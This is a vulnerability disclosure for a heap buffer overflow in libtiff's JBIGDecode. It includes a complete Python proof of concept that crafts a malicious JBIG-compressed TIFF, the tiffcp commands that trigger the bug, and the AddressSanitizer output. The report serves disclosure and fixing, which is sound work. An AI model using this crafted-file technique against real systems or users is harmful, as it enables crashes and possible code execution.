## Bug0: JBIGDecode ignores size parameter leading to heap buffer overflow

In `JBIGDecode()` in `libtiff/tif_jbig.c`, the function explicitly discards the caller-supplied `size` parameter at line 82 and then at line 125 copies the fully decoded JBIG image into `buffer` using the attacker-controlled BIE-header dimension via `jbg_dec_getsize(&decoder)`, overflowing the heap-allocated buffer by up to 8184 bytes.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffcp binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_PATH = "poc_input.tif"

# Valid JBIG BIE for a 256x256 all-white bilevel image (1 plane, 1 stripe).
# BIH (20 bytes): DL=0 D=0 P=1 reserved=0 X_D=256 Y_D=256 L0=256
#                 Mx=0 My=0 order=0 options=0
# Arithmetic-coded stripe data followed by zero-padding to 1024 bytes.
BIE_DATA = (
    b'\x00\x00\x01\x00'   # DL=0 D=0 P=1 reserved=0
    b'\x00\x00\x01\x00'   # X_D = 256 (big-endian)
    b'\x00\x00\x01\x00'   # Y_D = 256 (big-endian)
    b'\x00\x00\x01\x00'   # L0  = 256 (big-endian, single stripe)
    b'\x00\x00\x00\x00'   # Mx=0 My=0 order=0 options=0
    b'\x4b\xc8\xff\x02'   # arithmetic-coded stripe data (all-white, 256x256)
    + bytes(1000)          # zero-pad to 1024 bytes total
)
assert len(BIE_DATA) == 1024
assert struct.unpack(">I", BIE_DATA[4:8])[0]  == 256, "X_D mismatch"
assert struct.unpack(">I", BIE_DATA[8:12])[0] == 256, "Y_D mismatch"

# Build TIFF (little-endian):
#   Offset   0: header (8 bytes)
#   Offset   8: IFD (2 + 10*12 + 4 = 126 bytes)
#   Offset 134: JBIG BIE strip (1024 bytes)
IFD_WIDTH    = 8
IFD_HEIGHT   = 8
STRIP_OFFSET = 8 + 2 + 10 * 12 + 4   # = 134

TIFF_SHORT = 3
TIFF_LONG  = 4

# IFD declares tiny 8x8 image so libtiff allocates only 8 bytes for the strip
# buffer. FillOrder=2 (LSB2MSB) prevents TIFFReverseBits() from scrambling the
# BIE header before jbg_dec_in sees it.
ifd_entries = [
    (0x0100, TIFF_SHORT, 1, IFD_WIDTH),          # ImageWidth  = 8
    (0x0101, TIFF_SHORT, 1, IFD_HEIGHT),          # ImageLength = 8
    (0x0102, TIFF_SHORT, 1, 1),                   # BitsPerSample = 1
    (0x0103, TIFF_SHORT, 1, 34661),               # Compression = JBIG (0x8765)
    (0x0106, TIFF_SHORT, 1, 1),                   # PhotometricInterpretation = BlackIsZero
    (0x010A, TIFF_SHORT, 1, 2),                   # FillOrder = FILLORDER_LSB2MSB
    (0x0111, TIFF_LONG,  1, STRIP_OFFSET),        # StripOffsets
    (0x0115, TIFF_SHORT, 1, 1),                   # SamplesPerPixel
    (0x0116, TIFF_LONG,  1, IFD_HEIGHT),          # RowsPerStrip = 8
    (0x0117, TIFF_LONG,  1, len(BIE_DATA)),       # StripByteCounts = 1024
]

header = struct.pack("<2sHI", b"II", 42, 8)

ifd = struct.pack("<H", len(ifd_entries))
for tag, typ, cnt, val in ifd_entries:
    ifd += struct.pack("<HHI", tag, typ, cnt)
    if typ == TIFF_SHORT:
        ifd += struct.pack("<HH", val, 0)
    else:
        ifd += struct.pack("<I", val)
ifd += struct.pack("<I", 0)   # next IFD = 0

tiff_data = header + ifd + BIE_DATA
assert len(header) + len(ifd) == STRIP_OFFSET, "strip offset mismatch"

with open(OUTPUT_PATH, "wb") as f:
    f.write(tiff_data)

buf_alloc = (IFD_WIDTH * IFD_HEIGHT + 7) // 8    # 8 bytes
memcpy_sz = (256 * 256 + 7) // 8                  # 8192 bytes
print(f"[+] Written: {OUTPUT_PATH}  ({len(tiff_data)} bytes)")
print(f"    IFD dims  : {IFD_WIDTH}x{IFD_HEIGHT}  -> libtiff alloc = {buf_alloc} bytes")
print(f"    BIE dims  : 256x256      -> _TIFFmemcpy = {memcpy_sz} bytes")
print(f"    Overflow  : {memcpy_sz - buf_alloc} bytes past end of heap buffer")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffcp -c none poc_input.tif /tmp/out_.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000078 at pc 0x7f7be70ef2c3 bp 0x7ffc9177a300 sp 0x7ffc91779aa8
WRITE of size 8192 into 8-byte allocation
  #0 __interceptor_memcpy (sanitizer_common_interceptors.inc:827)
  #1 JBIGDecode tif_jbig.c:125

### Impact

An attacker who supplies a crafted TIFF file with JBIG compression can cause a heap buffer overflow of up to 8184 bytes, overwriting adjacent heap objects such as function pointers or heap metadata. This overflow is reachable through any application that calls `TIFFReadEncodedStrip` on a JBIG-compressed TIFF, including the `tiffcp` transcoding tool. In the worst case the attacker achieves arbitrary code execution and in the best case causes a reliable process crash constituting a denial of service.
